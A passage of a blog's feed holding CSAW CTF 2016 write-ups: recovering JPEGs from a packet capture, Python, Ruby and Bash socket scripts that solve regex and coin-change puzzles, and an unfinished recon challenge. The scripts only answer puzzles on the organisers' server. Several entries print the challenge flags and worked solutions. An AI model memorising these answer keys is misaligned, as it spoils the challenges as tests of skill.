fixed!</div></pre></td></tr></table></figure>
<ul>
<li>Now look at the file, it seems better!</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #file fixed_kill.pcapng</div><div class="line">fixed_kill.pcapng: pcap-ng capture file - version 1.0</div></pre></td></tr></table></figure>
<ul>
<li>Now open the Pcap-Ng file with wireshark.</li>
<li>This is mainly a SFTP exchange so it may be interesting to look at downloaded filess with this filter: Filter <code>ftp.request.command == STOR</code>.</li>
<li>Filter show us 7 downloaded files at frame 53, 130, 693, 760, 813, 2325 and 2480. 5 jpg files (image) and 2 mp4 files (video).</li>
<li>So let’s extract images first. For that we need the jpg header file signature. It can be found here <a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="external">on Wikipedia</a>.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">JPEG RAW `FF D8 FF DB`</div><div class="line">JFIF begin with `FF D8 FF E0`</div><div class="line">EXIF `FF D8 FF E1`</div></pre></td></tr></table></figure>
<ul>
<li>The one interesting for us is <strong>JFIF</strong>.</li>
<li>Press <code>CTRL + F</code>, select <strong>Hex value</strong> as <strong>Display filter</strong>.</li>
<li>Note that it’s not necessary as the begining of the stream is not far after the STOR request command.</li>
<li>We won’t need to extract mp4 file, flag is in one of the images.</li>
<li>Now there is two way to do it: the smart way and the dumb way.</li>
<li><strong>Dumb way</strong>: see the flag in the ASCII representation of the frame 696 (girls.jpg). Ok it works, but if the flag have be not so badly hidden you won’t have seen it, for example if it was display on the image.</li>
<li><strong>Smart way</strong>: Let’s extract images.</li>
<li>Now that we know where are the files stream, we can extract files as mention:<ul>
<li>Right click on the first frame of the stream.</li>
<li>Click on <em>Follow TCP Stream</em>.</li>
<li>Select <em>Raw</em> representation.</li>
<li>Save it on your disk.</li>
</ul>
</li>
</ul>
<ul>
<li>Do the same with next images.</li>
</ul>
<ul>
<li>We can note that all images are seeable execpt girls.jpg. So what? A broken file again? Not really, if you want to see the file header in order to fix it, you discover that the flag was just injected in the file header.</li>
<li>Let’s see the raw hex dump of the image:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #xxd -l83 extract_girls.jpg</div><div class="line">00000000: ffd8 ffe0 bae0 4a46 4946 0001 0101 0001  ......JFIF......</div><div class="line">00000010: 0001 0000 fffe 003d 666c 6167 7b72 6f73  .......=flag&#123;ros</div><div class="line">00000020: 6573 5f72 5f62 6c75 655f 7669 6f6c 6574  es_r_blue_violet</div><div class="line">00000030: 735f 725f 7233 645f 6d61 7962 335f 6861  s_r_r3d_mayb3_ha</div><div class="line">00000040: 7261 6d62 6165 5f69 735f 6e6f 745f 6b69  rambae_is_not_ki</div><div class="line">00000050: 6c6c 7d                                  ll&#125;</div></pre></td></tr></table></figure>
<p>Thanks to <a href="https://shankaraman.wordpress.com/tag/how-to-extract-ftp-files-from-wireshark-packet/" target="_blank" rel="external">Shankar Raman</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF - 100 - Rgexepire - Misc</title>
    <link href="http://rawsec.ml/en/CSAW-2016-100-Regexpire-misc/"/>
    <id>http://rawsec.ml/en/CSAW-2016-100-Regexpire-misc/</id>
    <published>2016-09-17T22:00:00.000Z</published>
    <updated>2016-10-12T21:07:54.498Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : CSAW CTF Qualification Round 2016</li>
<li><strong>Website</strong> : <a href="https://ctf.csaw.io/" target="_blank" rel="external">https://ctf.csaw.io/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>I thought I found a perfect match but she ended up being my regEx girlfriend.</p>
<p><code>nc misc.chal.csaw.io 8001</code></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>It was very similar with <a href="https://backdoor.sdslabs.co/challenges/ISOLVE" target="_blank" rel="external">ISolve from BackdoorCTF 2016</a>.</p>
<p>I made 3 scripts to solve this:</p>
<ul>
<li>In Python with <a href="https://pypi.python.org/pypi/rstr/2.2.4" target="_blank" rel="external">rstr.xeger</a> (inspired by <a href="https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/ppc_isolve" target="_blank" rel="external">p4</a>)</li>
<li>In Ruby with <a href="https://rubygems.org/gems/regexp-examples/versions/1.2.0" target="_blank" rel="external">regexp-examples</a></li>
<li>In Bash with <a href="https://github.com/asciimoo/exrex" target="_blank" rel="external">exrex</a> (simplified version)</li>
</ul>
<p>I flaged with the Python one, the Ruby one work well too and the Bash one work badly due to the dirty way exrex handle regex. Here a proof of success (after the end of the CTF) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">to solve = &apos;(wolf|gazelle)*[V8xqjx0A8]+[AoqoYnDiu]i3b+[ukqUrDlf]xf+(tomato|elephant)*(clinton|tomato)&apos;</div><div class="line">solution  = wolfgazellegazellegazellewolfwolfgazelle88xj8Ajx0xAjqx8xxAx8088AqVV0jV8Axjxx8qjV8x8qV0x8V0ii3bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbqxffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffftomatotomatoelephantelephanttomatoelephanttomatotomatoelephanttomatoelephanttomatoelephantelephantelephanttomatotomatotomatotomatoelephantelephanttomatotomatoelephantelephanttomatotomatoelephanttomatoelephantelephanttomatoelephanttomatotomato</div><div class="line">D*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*\d+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;</div><div class="line">to solve = &apos;D*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*1+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;&apos;</div><div class="line">solution  = DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDmkpkoijmnrniprlknjppmmrjnlqqpjilrnqjmimkkmrndolphinclintonqz444444444444444444444444444444444444444444111111111111111111111111111111111111111111111111111111111111111111111111DMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMvvvvvvvvvhfishpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinpenguinpenguinslothslothslothslothpenguinslothpenguinslothpenguinslothpenguinslothpenguinpenguinslothslothpenguinpenguinslothpenguinslothpenguinpenguinslothpenguinpenguinslothslothpenguinslothpenguinchairchairchairclintonchairclintonchair</div><div class="line">flag&#123;^regularly_express_yourself$&#125;</div><div class="line">to solve = &apos;flag&#123;^regularly_express_yourself$&#125;&apos;</div><div class="line">solution  = flag&#123;regularly_express_yourself&#125;</div></pre></td></tr></table></figure>
<p>Python:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> rstr</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper_reg</span><span class="params">(s)</span>:</span></div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[W]&#123;1&#125;'</span>, <span class="string">' '</span>, s)</div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[W]&#123;1&#125;'</span>, <span class="string">'a'</span>, s)</div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[d]&#123;1&#125;'</span>, <span class="string">'1'</span>, s)</div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[D]&#123;1&#125;'</span>, <span class="string">'#'</span>, s)</div><div class="line">  <span class="keyword">return</span> s</div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">def wrapper(s):</div><div class="line">  s = re.sub('\s+', '\t', s)</div><div class="line">  s = re.sub('[^0-9a-zA-Z\s]+', '#', s)</div><div class="line">  return s</div><div class="line">"""</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(s)</span>:</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999</span>):</div><div class="line">        c = s.recv(<span class="number">1</span>)</div><div class="line">        <span class="keyword">if</span>(c == <span class="string">'\n'</span>):</div><div class="line">            <span class="keyword">break</span></div><div class="line">        data += c</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">"misc.chal.csaw.io"</span></div><div class="line">    port = <span class="number">8001</span></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((url, port))</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</div><div class="line">            task = recvuntil(s)</div><div class="line">            print(task)</div><div class="line">            i = <span class="number">1</span></div><div class="line">        task = recvuntil(s)</div><div class="line">        print(task)</div><div class="line">        to_solve = task</div><div class="line">        <span class="keyword">if</span> len(to_solve) == <span class="number">0</span>:</div><div class="line">            print(task)</div><div class="line">        <span class="keyword">elif</span>(to_solve == <span class="string">'Irregular'</span> <span class="keyword">or</span> to_solve == <span class="string">'Timeout'</span>):</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            to_solve = wrapper_reg(to_solve)</div><div class="line">            print(<span class="string">"to solve = '%s'"</span> % to_solve)</div><div class="line">            solution = rstr.xeger(to_solve).replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">            <span class="comment">#solution = wrapper(solution)</span></div><div class="line">            print(<span class="string">"solution  = %s"</span> % solution)</div><div class="line">            s.sendall(solution + <span class="string">"\n"</span>)</div><div class="line">        sleep(<span class="number">0.1</span>)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
<p>Ruby:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">### Dependencies ###</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'regexp-examples'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">### Functions ###</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(s)</span></span></div><div class="line">  s = s.gsub(<span class="string">'\s+'</span>, <span class="string">'\t'</span>)</div><div class="line">  s = s.gsub(<span class="string">'[^0-9a-zA-Z\s]+'</span>, <span class="string">'#'</span>)</div><div class="line">  <span class="keyword">return</span> s</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Main ###</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __FILE_<span class="number">_</span> == $0</div><div class="line">  hostname = <span class="string">'misc.chal.csaw.io'</span></div><div class="line">  port = <span class="number">8001</span></div><div class="line"></div><div class="line">  s = TCPSocket.open(hostname, port)</div><div class="line">  output = <span class="string">""</span></div><div class="line">  exit_test = <span class="literal">nil</span></div><div class="line"></div><div class="line">  <span class="comment"># pass Can you match these regexes?</span></div><div class="line">  line = s.gets</div><div class="line">  puts line.chop</div><div class="line"></div><div class="line">  <span class="keyword">while</span> <span class="keyword">not</span> exit_test</div><div class="line">    line = s.gets       <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop      <span class="comment"># And print with platform line terminator</span></div><div class="line">    output = output.concat(line)</div><div class="line"></div><div class="line">    <span class="comment"># stop = /Can you match these regexes?\s+(.*)/.match(output)</span></div><div class="line">    stop = <span class="literal">true</span></div><div class="line">    <span class="keyword">if</span> stop</div><div class="line">      reg_test = output.match(<span class="regexp">/(.*)/</span>)</div><div class="line">      reg = <span class="regexp">/<span class="subst">#&#123;reg_test[<span class="number">1</span>]&#125;</span>/</span></div><div class="line">      example = reg.random_example</div><div class="line">      example = wrapper(example)</div><div class="line">      <span class="keyword">if</span> example != <span class="literal">nil</span></div><div class="line">        puts <span class="string">"solution :"</span> + example</div><div class="line">      <span class="keyword">end</span></div><div class="line">      s.puts(example.gsub(<span class="string">'\n'</span>, <span class="string">''</span>))</div><div class="line">      s.flush</div><div class="line">      output = <span class="string">""</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    exit_test = <span class="regexp">/Failed regex/</span>.match(output)</div><div class="line">    <span class="keyword">if</span> exit_test</div><div class="line">      exit(<span class="number">1</span>)</div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line">  s.close               <span class="comment"># Close the socket when done</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<p>Bash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="comment">#######</span></div><div class="line"><span class="comment">#Config</span></div><div class="line"></div><div class="line">URL=<span class="string">"misc.chal.csaw.io"</span></div><div class="line">PORT=8001</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#####</span></div><div class="line"><span class="comment">#Main</span></div><div class="line"></div><div class="line">OUT=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="comment"># Open socket</span></div><div class="line"><span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="variable">$&#123;URL&#125;</span>/<span class="variable">$&#123;PORT&#125;</span></div><div class="line"></div><div class="line"><span class="built_in">read</span> LINE &lt;&amp;3</div><div class="line"><span class="built_in">echo</span> <span class="variable">$LINE</span> &gt;&amp;1</div><div class="line"><span class="keyword">while</span> [ -z <span class="string">"<span class="variable">$EXIT</span>"</span> ]</div><div class="line"><span class="keyword">do</span></div><div class="line"></div><div class="line">	<span class="built_in">read</span> LINE &lt;&amp;3</div><div class="line">	<span class="built_in">echo</span> <span class="variable">$LINE</span> &gt;&amp;1</div><div class="line">	exrex -r <span class="string">"<span class="variable">$LINE</span>"</span> &gt;&amp;3</div><div class="line">	OUT=<span class="string">""</span></div><div class="line"></div><div class="line">	EXIT=$( <span class="built_in">echo</span> <span class="string">"<span class="variable">$OUT</span>"</span> | awk <span class="string">'/Irregular/ &#123; getline; print $0 &#125;'</span> )</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>My point of view: This kind of chanllenge is tricky due to bad implementation of regex server and/or regex solver so you always need to fix/wrap regex answers/solutions. I think it’s better to put a short timeout (&lt;1s) rather than a lot a steps (100+) to prevent humans to do it by hand because the more steps there are the more chances you have to get a bug. I think the goal of the challenge is to make user script, use regex and parsing, use socket but not to correct/complete other’s tools.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF - 10 - Music to my ears - Reconnaissance</title>
    <link href="http://rawsec.ml/en/CSAW-2016-10-Music-to-my-ears-Recon/"/>
    <id>http://rawsec.ml/en/CSAW-2016-10-Music-to-my-ears-Recon/</id>
    <published>2016-09-17T22:00:00.000Z</published>
    <updated>2016-10-12T21:07:54.495Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : CSAW CTF Qualification Round 2016</li>
<li><strong>Website</strong> : <a href="https://ctf.csaw.io/" target="_blank" rel="external">https://ctf.csaw.io/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Yo fam have you listened to my mixtape?</p>
<p><code>user:1245880440:playlist:7bUFR2ujh1p3GfArxM0dHE</code></p>
<p>Hint: The recon spans multiple sites.</p>
<p>Author: breadchris</p>
<p>Hint 2 was an image of a beet.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>Note</strong>: I didn’t finished the challenge.</p>
<ul>
<li>We have to look for an user and a playlist.</li>
<li>Spotify look like to only big website to use a number id as username, so forge the URL like this:  <a href="https://play.spotify.com/user/1245880440/playlist/7bUFR2ujh1p3GfArxM0dHE" target="_blank" rel="external">https://play.spotify.com/user/1245880440/playlist/7bUFR2ujh1p3GfArxM0dHE</a>.</li>
<li>So we got a playlist named <strong>Awesome CTF Music Mix Vol. 1</strong>. It’s certainly the good one. The user is <strong>Chris Topher</strong>.</li>
<li>Take the 1st letter of each songs: <strong>CHECKOUTTHELASTRADIOSTATION</strong>. What is the last radio station? A link with WGU-20 ? Last.fm ? I didn’t find.</li>
<li>The second hint is an image of a beet so we can directly think about <a href="http://beets.io/" target="_blank" rel="external">beets.io/</a>.</li>
<li>No more clue  to go further.</li>
</ul>
<p>My point of view: CTF organizers, PLEASE, stop to put this kind of useless challenges that make us loose our time and that have no link with cyber-security.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="reconnaissance" scheme="http://rawsec.ml/tags/reconnaissance/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF - 25 - Coinslot - Misc</title>
    <link href="http://rawsec.ml/en/CSAW-2016-25-coinslot-misc/"/>
    <id>http://rawsec.ml/en/CSAW-2016-25-coinslot-misc/</id>
    <published>2016-09-17T22:00:00.000Z</published>
    <updated>2016-10-12T21:07:54.495Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : CSAW CTF Qualification Round 2016</li>
<li><strong>Website</strong> : <a href="https://ctf.csaw.io/" target="_blank" rel="external">https://ctf.csaw.io/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p><em>#Hope #Change #Obama2008</em></p>
<p><code>nc misc.chal.csaw.io 8000</code></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The problem here is to split up a sum of money into its equivalent in bills and coins (minimum).</p>
<p>Here we have to script again:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">total = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(s, pattern, tryouts)</span>:</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(tryouts):</div><div class="line">        <span class="comment"># sleep(1)</span></div><div class="line">        data += s.recv(<span class="number">9999</span>)</div><div class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> data:</div><div class="line">            <span class="keyword">return</span> data</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(bills)</span>:</span></div><div class="line">    <span class="keyword">global</span> total</div><div class="line">    times = Decimal(str(total)) / Decimal(str(bills))</div><div class="line">    <span class="keyword">if</span> times &gt;= <span class="number">1</span>:</div><div class="line">        total = Decimal(str(total)) - Decimal(str(int(times))) * Decimal(str(bills))</div><div class="line">    <span class="keyword">return</span> int(times)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> 